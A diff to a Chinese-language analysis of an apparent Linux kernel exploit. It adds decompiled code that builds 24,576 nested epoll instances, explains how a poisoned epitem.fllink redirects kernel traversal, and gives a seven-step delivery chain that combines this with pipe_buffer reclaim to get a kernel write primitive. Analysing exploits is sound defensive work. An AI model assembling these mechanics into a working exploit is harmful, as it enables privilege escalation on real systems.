@@ -710,6 +710,9 @@ late_refs fd_preflight current=%d graph_additional=%d required_total=%d
 > **这推翻了批次 D 的初始范围估计**（按 240 根管道规划）。
 > 实际还需：抬 `RLIMIT_NOFILE` 至 ≥ `当前 + 24736`、批量创建并注册 ≈24.5k 个 fd、
 > 构建 `epitem.fllink` 宽图。**此项若遗漏，做出的图比目标窄约两个数量级。**
+>
+> **后续已查明具体构造方式：这些 fd 是 24,576 个嵌套 epoll 实例，
+> 见 §2.16（本文只给出规模，未给出构造）。**
 
 另注：存在**两个**暂存缓冲区 —— 不同阶段分别 `memset` 为 `0x42`('B') 与 `0x4b`('K')。
 
@@ -728,6 +731,57 @@ pipe_buffer=0x28 pipe_flags=0x18 pipe_slots=32 pipe_ring=0x500 pipe_object=0x800
 
 注意其中 `mcast_sources=14`、`mcast_kernel_size=0xf8` 两项**不在**本仓库 profile 中 ——
 它们属于 `multicast_waiter` 家族的常量，`fd_graph` 未引用。
+
+### 2.16 指令级+反编译：fd 图 = 96×256 个**嵌套 epoll**（核心机制）
+
+`annotated.c:5255`–`5280`（`pipe_worker` 内）：
+
+```c
+uVar12 = FUN_0023c754(0x80000);                        /* epoll_create1(EPOLL_CLOEXEC) */
+*(uint *)(lVar19 + uVar31 * 4) = uVar12;
+if ((int)uVar12 < 0) { fatal; }
+do {                                                  /* 外层：width  = 96  (0x60) */
+  do {                                                /* 内层：fanout = 256 (0x100) */
+    uVar23 = FUN_0023c754(0x80000);                    /* epoll_create1(EPOLL_CLOEXEC) */
+    if ((int)uVar23 < 0) { fatal; }
+    local_210 = uVar33; uStack520 = (ulong)uVar12;    /* epoll_event.data = {uVar33, uVar12} */
+    iVar9 = FUN_00257500(uVar23, 1, uVar12, &local_210); /* epoll_ctl(new, ADD, prev_epoll_fd, ev) */
+    if (iVar9 != 0) { fatal; }
+    uVar13 = uVar13 + 1;
+  } while (uVar13 != 0x100);
+  uVar31 = uVar31 + 1;
+} while (uVar31 != 0x60);
+FUN_0024094c("GRAPH_READY width=%d fanout=%d edges=%d\n", 0x60, 0x100, 0x6000);
+```
+
+即：**新建 24,576 个 epoll 实例，每个把「上一个 epoll 的 fd」注册进自己。**
+这与 §2.14 的 `RLIMIT_NOFILE` 前置检查精确吻合：`0x6000 (24576) + 0xa0 (160) = 0x60a0`。
+
+> **注**：`epoll_ctl` 的第 2 参数为 `1` = `EPOLL_CTL_ADD`。
+
+#### 2.16.1 这一条解释了此前所有困惑
+
+| 现象 | 解释 |
+|---|---|
+| profile 为何带 `eventpoll_size` / `epitem_ep` / `epitem_fllink` | 图就是 epoll；`epitem.fllink` 是被投毒的链 |
+| 为何存在 `EPOLL_CTL_DEL(event=NULL)` | 摘除一个 epitem 即回收触发点 |
+| `fake_fllink = LIST_POISON1 + 8` 为何关键 | 被投毒的 `epitem.fllink` 让内核遍历时的 `list_entry()` 落点偏移到受控对象 |
+| 写入目标为何只是**普通 fd** | 内核在遍历嵌套 epoll 时**自己**解引用被植入的指针 |
+| `0xf0 = 240` 为何不匹配图宽 | 240 是 `pipe_buffer` **回收表**槽数，与 epoll 图是**两个独立机制** |
+
+#### 2.16.2 完整投递链（综合 §2.7–§2.16）
+
+1. **建图**：96 × 256 = 24,576 个嵌套 epoll，形成宽 `epitem.fllink` 链（§2.16）
+2. **回收**：240 根管道经 `F_SETPIPE_SZ` 两级缩放 + `F_GETPIPE_SZ` 回读（§2.7、§2.10）
+3. **建表**：64 KiB 用户态缓冲内构造 16 项重定向表（§2.11、§2.12）
+4. **植毒**：`fake_fllink = base | 0x108`（§2.8）
+5. **喷入**：把表复制进刚释放的管环（§2.12）
+6. **触发**：240 路 `write()`，内核沿被重定向的指针写入（§2.9）
+7. **校验**：`pread64` 按槽位偏移回读（§2.9）
+
+**epoll 图提供「宽链 + 可投毒的遍历」，pipe_buffer 回收提供「可写的落点」，
+两者叠加才构成完整原语。** 只移植其一会失败：只有 epoll 图而无回收槽，
+内核遍历到投毒项时无有效落点；只有回收槽而无宽链，则无从触发遍历。
 
 ## 3. 真实机制（综合 §2）
 
